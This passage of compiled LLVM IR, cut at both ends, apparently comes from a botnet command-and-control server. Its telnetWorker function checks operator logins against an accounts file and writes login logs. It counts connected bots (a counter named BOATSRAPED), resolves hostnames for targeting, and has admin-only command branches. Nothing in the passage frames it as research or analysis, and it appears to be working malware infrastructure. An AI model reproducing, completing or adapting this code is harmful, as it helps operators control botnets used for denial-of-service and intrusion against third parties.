  %26 = call i64 @send(i32 %5, i8* nonnull %7, i64 %25, i32 16384) #10
  %27 = call i32 @sleep(i32 1) #10
  br label %.loopexit.loopexit5
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

declare i32 @sleep(i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define noalias i8* @telnetWorker(i8*) #0 {
  %2 = alloca i64, align 8
  %3 = alloca [2048 x i8], align 16
  %4 = alloca [80 x i8], align 16
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [80 x i8], align 16
  %7 = alloca [512 x i8], align 16
  %8 = alloca [512 x i8], align 16
  %9 = alloca [100 x i8*], align 16
  %10 = alloca [20 x i8], align 16
  %11 = alloca [50 x i8*], align 16
  %12 = ptrtoint i8* %0 to i64
  %13 = trunc i64 %12 to i32
  %14 = load volatile i32, i32* @managesConnected, align 4
  %15 = add nsw i32 %14, 1
  store volatile i32 %15, i32* @managesConnected, align 4
  %16 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 2048, i32 16, i1 false)
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 2048, i32 16, i1 false)
  %18 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %19 = tail call i32 @feof(%struct._IO_FILE* %18) #10
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %.lr.ph166.preheader, label %._crit_edge167.thread

.lr.ph166.preheader:                              ; preds = %1
  br label %.lr.ph166

._crit_edge167.thread:                            ; preds = %1
  tail call void @rewind(%struct._IO_FILE* %18)
  br label %.lr.ph163.preheader

.lr.ph166:                                        ; preds = %.lr.ph166.preheader, %.lr.ph166
  %.0142164 = phi i32 [ %22, %.lr.ph166 ], [ 0, %.lr.ph166.preheader ]
  %21 = tail call i32 @fgetc(%struct._IO_FILE* %18)
  %22 = add nuw nsw i32 %.0142164, 1
  %23 = tail call i32 @feof(%struct._IO_FILE* %18) #10
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %.lr.ph166, label %._crit_edge167

._crit_edge167:                                   ; preds = %.lr.ph166
  tail call void @rewind(%struct._IO_FILE* %18)
  %25 = icmp eq i32 %.0142164, 0
  br i1 %25, label %._crit_edge, label %.lr.ph163.preheader

.lr.ph163.preheader:                              ; preds = %._crit_edge167.thread, %._crit_edge167
  %26 = phi i32 [ -1, %._crit_edge167.thread ], [ %.0142164, %._crit_edge167 ]
  %wide.trip.count = zext i32 %26 to i64
  br label %.lr.ph163

.lr.ph163:                                        ; preds = %.lr.ph163.preheader, %.lr.ph163
  %indvars.iv175 = phi i64 [ 0, %.lr.ph163.preheader ], [ %indvars.iv.next176, %.lr.ph163 ]
  %27 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv175, i32 0, i64 0
  %28 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv175, i32 1, i64 0
  %29 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %indvars.iv175, i32 2, i64 0
  %30 = tail call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.27, i64 0, i64 0), i8* %27, i8* %28, i8* %29) #10
  %indvars.iv.next176 = add nuw nsw i64 %indvars.iv175, 1
  %exitcond = icmp eq i64 %indvars.iv.next176, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph163

._crit_edge.loopexit:                             ; preds = %.lr.ph163
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge167
  %31 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %32 = icmp slt i32 %31, 1
  br i1 %32, label %.loopexit151, label %33

; <label>:33:                                     ; preds = %._crit_edge
  %34 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.26, i64 0, i64 0)) #9
  %35 = icmp eq i8* %34, null
  br i1 %35, label %.loopexit151, label %36

; <label>:36:                                     ; preds = %33
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.28, i64 0, i64 0), i64 30, i32 1, i1 false)
  %37 = call i64 @strlen(i8* nonnull %17) #9
  %38 = call i64 @send(i32 %13, i8* nonnull %17, i64 %37, i32 16384) #10
  %39 = icmp eq i64 %38, -1
  br i1 %39, label %.loopexit151, label %40

; <label>:40:                                     ; preds = %36
  %41 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %42 = icmp slt i32 %41, 1
  br i1 %42, label %.loopexit151, label %43

; <label>:43:                                     ; preds = %40
  call void @trim(i8* nonnull %16)
  %44 = getelementptr inbounds [80 x i8], [80 x i8]* %4, i64 0, i64 0
  %45 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %44, i8* nonnull %16) #10
  %46 = call i32 @Search_in_File(i8* nonnull %16)
  %47 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %48 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %47, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* nonnull %16)
  %49 = call i32 @fclose(%struct._IO_FILE* %47)
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.32, i64 0, i64 0), i8* nonnull %16)
  %51 = sext i32 %46 to i64
  %52 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 0, i64 0
  %53 = call i32 @strcmp(i8* nonnull %16, i8* %52) #9
  %54 = icmp eq i32 %53, 0
  br i1 %54, label %55, label %69

; <label>:55:                                     ; preds = %43
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.33, i64 0, i64 0), i64 30, i32 1, i1 false)
  %56 = call i64 @strlen(i8* nonnull %17) #9
  %57 = call i64 @send(i32 %13, i8* nonnull %17, i64 %56, i32 16384) #10
  %58 = icmp eq i64 %57, -1
  br i1 %58, label %.loopexit151, label %59

; <label>:59:                                     ; preds = %55
  %60 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %61 = icmp slt i32 %60, 1
  br i1 %61, label %.loopexit151, label %62

; <label>:62:                                     ; preds = %59
  call void @trim(i8* nonnull %16)
  %63 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 1, i64 0
  %64 = call i32 @strcmp(i8* nonnull %16, i8* %63) #9
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %62
  call void @llvm.memset.p0i8.i64(i8* nonnull %16, i8 0, i64 2048, i32 16, i1 false)
  %67 = call i64 @send(i32 %13, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 14, i32 16384) #10
  %68 = icmp eq i64 %67, -1
  br i1 %68, label %.loopexit151, label %76

; <label>:69:                                     ; preds = %62, %43
  %70 = call i64 @send(i32 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i64 0, i64 0), i64 5, i32 16384) #10
  %71 = icmp eq i64 %70, -1
  br i1 %71, label %.loopexit151, label %72

; <label>:72:                                     ; preds = %69
  %73 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %74 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %73, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.35, i64 0, i64 0), i8* nonnull %16)
  %75 = call i32 @fclose(%struct._IO_FILE* %73)
  br label %.loopexit151

; <label>:76:                                     ; preds = %66
  %77 = getelementptr inbounds [80 x i8], [80 x i8]* %6, i64 0, i64 0
  %78 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %77, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.37, i64 0, i64 0), i8* %52) #10
  %79 = call i64 @strlen(i8* nonnull %77) #9
  %80 = call i64 @send(i32 %13, i8* nonnull %77, i64 %79, i32 16384) #10
  %81 = icmp eq i64 %80, -1
  br i1 %81, label %.loopexit151, label %82

; <label>:82:                                     ; preds = %76
  %83 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @titleWriter, i8* %0) #10
  %sext147 = shl i64 %12, 32
  %84 = ashr exact i64 %sext147, 32
  %85 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %84, i32 2, i64 0
  %strlen = call i64 @strlen(i8* %52)
  %leninc = add i64 %strlen, 1
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %85, i8* %52, i64 %leninc, i32 4, i1 false)
  %86 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %84, i32 1
  store i32 1, i32* %86, align 4
  %87 = call i32 @fdgets(i8* nonnull %16, i32 2048, i32 %13)
  %88 = icmp sgt i32 %87, 0
  br i1 %88, label %.lr.ph, label %.loopexit151

.lr.ph:                                           ; preds = %82
  %89 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 2, i64 0
  %90 = bitcast [50 x i8*]* %11 to i8*
  %91 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 2, i64 0
  %92 = getelementptr inbounds [20 x i8], [20 x i8]* %10, i64 0, i64 0
  %93 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 2, i64 0
  %94 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %51, i32 2, i64 0
  %95 = getelementptr inbounds [100 x i8*], [100 x i8*]* %9, i64 0, i64 0
  %96 = bitcast [100 x i8*]* %9 to i8*
  %97 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %98 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  br label %99

; <label>:99:                                     ; preds = %.lr.ph, %.backedge
  %100 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.38, i64 0, i64 0)) #9
  %101 = icmp eq i8* %100, null
  br i1 %101, label %102, label %108

; <label>:102:                                    ; preds = %99
  %103 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.39, i64 0, i64 0)) #9
  %104 = icmp eq i8* %103, null
  br i1 %104, label %105, label %108

; <label>:105:                                    ; preds = %102
  %106 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.40, i64 0, i64 0)) #9
  %107 = icmp eq i8* %106, null
  br i1 %107, label %136, label %108

; <label>:108:                                    ; preds = %105, %102, %99
  %109 = call i32 @joinn()
  br label %110

; <label>:110:                                    ; preds = %108, %128
  %indvars.iv = phi i64 [ 0, %108 ], [ %indvars.iv.next, %128 ]
  %111 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv
  %112 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %indvars.iv, i32 1
  %113 = load i32, i32* %112, align 4
  %114 = icmp slt i32 %113, 1
  br i1 %114, label %115, label %117

; <label>:115:                                    ; preds = %110
  %116 = getelementptr inbounds %struct.name, %struct.name* %111, i64 0, i32 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* %116, i8 0, i64 512, i32 4, i1 false)
  br label %117

; <label>:117:                                    ; preds = %115, %110
  %118 = getelementptr inbounds %struct.name, %struct.name* %111, i64 0, i32 0, i64 0
  %119 = call i64 @strlen(i8* %118) #9
  %120 = icmp eq i64 %119, 0
  br i1 %120, label %128, label %121

; <label>:121:                                    ; preds = %117
  %122 = load i32, i32* %112, align 4
  %123 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.41, i64 0, i64 0), i8* %118, i32 %122) #10
  %124 = call i64 @strlen(i8* nonnull %97) #9
  %125 = call i64 @send(i32 %13, i8* nonnull %97, i64 %124, i32 16384) #10
  %126 = icmp eq i64 %125, -1
  br i1 %126, label %.loopexit151.loopexit, label %127

; <label>:127:                                    ; preds = %121
  call void @llvm.memset.p0i8.i64(i8* nonnull %97, i8 0, i64 512, i32 16, i1 false)
  br label %128

; <label>:128:                                    ; preds = %117, %127
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %129 = icmp slt i64 %indvars.iv.next, 40
  br i1 %129, label %110, label %130

; <label>:130:                                    ; preds = %128
  %131 = call i32 @clientsConnected()
  %132 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %98, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.42, i64 0, i64 0), i32 %131) #10
  %133 = call i64 @strlen(i8* nonnull %98) #9
  %134 = call i64 @send(i32 %13, i8* nonnull %98, i64 %133, i32 16384) #10
  %135 = icmp eq i64 %134, -1
  br i1 %135, label %.loopexit151.loopexit184, label %136

; <label>:136:                                    ; preds = %105, %130
  %137 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.43, i64 0, i64 0)) #9
  %138 = icmp eq i8* %137, null
  br i1 %138, label %144, label %139

; <label>:139:                                    ; preds = %136
  %140 = load volatile i32, i32* @BOATSRAPED, align 4
  %141 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.44, i64 0, i64 0), i32 %140) #10
  %142 = call i64 @strlen(i8* nonnull %17) #9
  %143 = call i64 @send(i32 %13, i8* nonnull %17, i64 %142, i32 16384) #10
  br label %144

; <label>:144:                                    ; preds = %136, %139
  %145 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i64 0, i64 0)) #9
  %146 = icmp eq i8* %145, null
  br i1 %146, label %154, label %147

; <label>:147:                                    ; preds = %144
  %148 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.46, i64 0, i64 0)) #10
  %149 = getelementptr inbounds i8, i8* %148, i64 8
  call void @trim(i8* %149)
  %150 = call i32 @hostname_to_ip(i8* %149, i8* nonnull %96)
  %151 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.47, i64 0, i64 0), i8* %149, i8** nonnull %95) #10
  %152 = call i64 @strlen(i8* nonnull %17) #9
  %153 = call i64 @send(i32 %13, i8* nonnull %17, i64 %152, i32 16384) #10
  br label %154

; <label>:154:                                    ; preds = %144, %147
  %155 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.48, i64 0, i64 0)) #9
  %156 = icmp eq i8* %155, null
  br i1 %156, label %164, label %157

; <label>:157:                                    ; preds = %154
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.49, i64 0, i64 0), i64 37, i32 1, i1 false)
  %158 = call i64 @strlen(i8* nonnull %17) #9
  %159 = call i64 @send(i32 %13, i8* nonnull %17, i64 %158, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.50, i64 0, i64 0), i64 36, i32 1, i1 false)
  %160 = call i64 @strlen(i8* nonnull %17) #9
  %161 = call i64 @send(i32 %13, i8* nonnull %17, i64 %160, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.51, i64 0, i64 0), i64 29, i32 1, i1 false)
  %162 = call i64 @strlen(i8* nonnull %17) #9
  %163 = call i64 @send(i32 %13, i8* nonnull %17, i64 %162, i32 16384) #10
  br label %164

; <label>:164:                                    ; preds = %154, %157
  %165 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0)) #9
  %166 = icmp eq i8* %165, null
  br i1 %166, label %174, label %167

; <label>:167:                                    ; preds = %164
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.53, i64 0, i64 0), i64 29, i32 1, i1 false)
  %168 = call i64 @strlen(i8* nonnull %17) #9
  %169 = call i64 @send(i32 %13, i8* nonnull %17, i64 %168, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.54, i64 0, i64 0), i64 29, i32 1, i1 false)
  %170 = call i64 @strlen(i8* nonnull %17) #9
  %171 = call i64 @send(i32 %13, i8* nonnull %17, i64 %170, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.55, i64 0, i64 0), i64 28, i32 1, i1 false)
  %172 = call i64 @strlen(i8* nonnull %17) #9
  %173 = call i64 @send(i32 %13, i8* nonnull %17, i64 %172, i32 16384) #10
  br label %174

; <label>:174:                                    ; preds = %164, %167
  %175 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.56, i64 0, i64 0)) #9
  %176 = icmp eq i8* %175, null
  br i1 %176, label %197, label %177

; <label>:177:                                    ; preds = %174
  %178 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i8* %94) #9
  %179 = icmp eq i32 %178, 0
  br i1 %179, label %183, label %180

; <label>:180:                                    ; preds = %177
  %181 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %94) #9
  %182 = icmp eq i32 %181, 0
  br i1 %182, label %183, label %194

; <label>:183:                                    ; preds = %180, %177
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.57, i64 0, i64 0), i64 51, i32 1, i1 false)
  %184 = call i64 @strlen(i8* nonnull %17) #9
  %185 = call i64 @send(i32 %13, i8* nonnull %17, i64 %184, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.58, i64 0, i64 0), i64 46, i32 1, i1 false)
  %186 = call i64 @strlen(i8* nonnull %17) #9
  %187 = call i64 @send(i32 %13, i8* nonnull %17, i64 %186, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.59, i64 0, i64 0), i64 66, i32 1, i1 false)
  %188 = call i64 @strlen(i8* nonnull %17) #9
  %189 = call i64 @send(i32 %13, i8* nonnull %17, i64 %188, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.60, i64 0, i64 0), i64 32, i32 1, i1 false)
  %190 = call i64 @strlen(i8* nonnull %17) #9
  %191 = call i64 @send(i32 %13, i8* nonnull %17, i64 %190, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i64 0, i64 0), i64 39, i32 1, i1 false)
  %192 = call i64 @strlen(i8* nonnull %17) #9
  %193 = call i64 @send(i32 %13, i8* nonnull %17, i64 %192, i32 16384) #10
  br label %197

; <label>:194:                                    ; preds = %180
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0), i64 41, i32 1, i1 false)
  %195 = call i64 @strlen(i8* nonnull %17) #9
  %196 = call i64 @send(i32 %13, i8* nonnull %17, i64 %195, i32 16384) #10
  br label %197

; <label>:197:                                    ; preds = %174, %183, %194
  %198 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i64 0, i64 0)) #9
  %199 = icmp eq i8* %198, null
  br i1 %199, label %205, label %200

; <label>:200:                                    ; preds = %197
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.64, i64 0, i64 0), i64 28, i32 1, i1 false)
  %201 = call i64 @strlen(i8* nonnull %17) #9
  %202 = call i64 @send(i32 %13, i8* nonnull %17, i64 %201, i32 16384) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.65, i64 0, i64 0), i64 24, i32 1, i1 false)
  %203 = call i64 @strlen(i8* nonnull %17) #9
  %204 = call i64 @send(i32 %13, i8* nonnull %17, i64 %203, i32 16384) #10
  br label %205

; <label>:205:                                    ; preds = %197, %200
  %206 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i64 0, i64 0)) #9
  %207 = icmp eq i8* %206, null
  br i1 %207, label %208, label %211

; <label>:208:                                    ; preds = %205
  %209 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i64 0, i64 0)) #9
  %210 = icmp eq i8* %209, null
  br i1 %210, label %221, label %211

; <label>:211:                                    ; preds = %208, %205
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i64 0, i64 0), i64 5, i32 1, i1 false)
  %212 = call i64 @strlen(i8* nonnull %17) #9
  %213 = call i64 @send(i32 %13, i8* nonnull %17, i64 %212, i32 16384) #10
  %214 = call i64 @send(i32 %13, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.69, i64 0, i64 0), i64 17, i32 16384) #10
  %215 = icmp eq i64 %214, -1
  br i1 %215, label %.loopexit151.loopexit184, label %216

; <label>:216:                                    ; preds = %211
  %217 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %218 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %217, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i64 0, i64 0), i8* %52)
  %219 = call i32 @fclose(%struct._IO_FILE* %217)
  %220 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i64 0, i64 0), i8* %52)
  br label %221

; <label>:221:                                    ; preds = %208, %216
  %222 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i64 0, i64 0)) #9
  %223 = icmp eq i8* %222, null
  br i1 %223, label %229, label %224

; <label>:224:                                    ; preds = %221
  %225 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i64 0, i64 0))
  %226 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %225, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i64 0, i64 0), i8* %52)
  %227 = call i32 @fclose(%struct._IO_FILE* %225)
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i64 0, i64 0), i8* %52)
  br label %229

; <label>:229:                                    ; preds = %221, %224
  %230 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i64 0, i64 0)) #9
  %231 = icmp eq i8* %230, null
  br i1 %231, label %235, label %232

; <label>:232:                                    ; preds = %229
  %233 = call i64 @send(i32 %13, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i64 0, i64 0), i64 16, i32 16384) #10
  %234 = icmp eq i64 %233, -1
  br i1 %234, label %.loopexit151.loopexit184, label %235

; <label>:235:                                    ; preds = %229, %232
  %236 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i64 0, i64 0)) #9
  %237 = icmp eq i8* %236, null
  br i1 %237, label %.loopexit149, label %238

; <label>:238:                                    ; preds = %235
  %239 = call i32 @strcmp(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i64 0, i64 0), i8* %93) #9
  %240 = icmp eq i32 %239, 0
  br i1 %240, label %244, label %241

; <label>:241:                                    ; preds = %238
  %242 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %93) #9
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %244, label %263

; <label>:244:                                    ; preds = %241, %238
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i64 0, i64 0), i64 39, i32 1, i1 false)
  %245 = call i64 @strlen(i8* nonnull %17) #9
  %246 = call i64 @send(i32 %13, i8* nonnull %17, i64 %245, i32 16384) #10
  %247 = icmp eq i64 %246, -1
  br i1 %247, label %.loopexit148.loopexit185, label %.preheader.preheader

.preheader.preheader:                             ; preds = %244
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %261
  %indvars.iv171 = phi i64 [ %indvars.iv.next172, %261 ], [ 0, %.preheader.preheader ]
  %248 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv171, i32 2, i64 0
  %249 = call i64 @strlen(i8* %248) #9
  %250 = icmp ugt i64 %249, 1
  br i1 %250, label %251, label %261

; <label>:251:                                    ; preds = %.preheader
  %252 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv171, i32 1
  %253 = load i32, i32* %252, align 4
  %254 = icmp eq i32 %253, 1
  br i1 %254, label %255, label %261

; <label>:255:                                    ; preds = %251
  %256 = trunc i64 %indvars.iv171 to i32
  %257 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.77, i64 0, i64 0), i32 %256, i8* nonnull %248) #10
  %258 = call i64 @strlen(i8* nonnull %17) #9
  %259 = call i64 @send(i32 %13, i8* nonnull %17, i64 %258, i32 16384) #10
  %260 = icmp eq i64 %259, -1
  br i1 %260, label %.loopexit148.loopexit183, label %261

; <label>:261:                                    ; preds = %.preheader, %251, %255
  %indvars.iv.next172 = add nuw nsw i64 %indvars.iv171, 1
  %262 = icmp slt i64 %indvars.iv.next172, 1000000
  br i1 %262, label %.preheader, label %.loopexit149.loopexit

; <label>:263:                                    ; preds = %241
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %17, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i64 0, i64 0), i64 41, i32 1, i1 false)
  %264 = call i64 @strlen(i8* nonnull %17) #9
  %265 = call i64 @send(i32 %13, i8* nonnull %17, i64 %264, i32 16384) #10
  br label %.loopexit149

.loopexit149.loopexit:                            ; preds = %261
  br label %.loopexit149

.loopexit149:                                     ; preds = %.loopexit149.loopexit, %235, %263
  %266 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.78, i64 0, i64 0)) #9
  %267 = icmp eq i8* %266, null
  br i1 %267, label %.loopexit, label %268

; <label>:268:                                    ; preds = %.loopexit149
  %269 = call i32 @strcmp(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.25, i64 0, i64 0), i8* %91) #9
  %270 = icmp eq i32 %269, 0
  br i1 %270, label %271, label %327

; <label>:271:                                    ; preds = %268
  %272 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.79, i64 0, i64 0)) #9
  %273 = icmp eq i8* %272, null
  br i1 %273, label %274, label %277

; <label>:274:                                    ; preds = %271
  %275 = call i8* @strstr(i8* nonnull %16, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i64 0, i64 0)) #9
  %276 = icmp eq i8* %275, null
  br i1 %276, label %303, label %277

; <label>:277:                                    ; preds = %274, %271
  %278 = call i8* @strtok(i8* nonnull %16, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.81, i64 0, i64 0)) #10
  %279 = call i64 @strlen(i8* %278) #9
  %280 = getelementptr inbounds i8, i8* %278, i64 %279
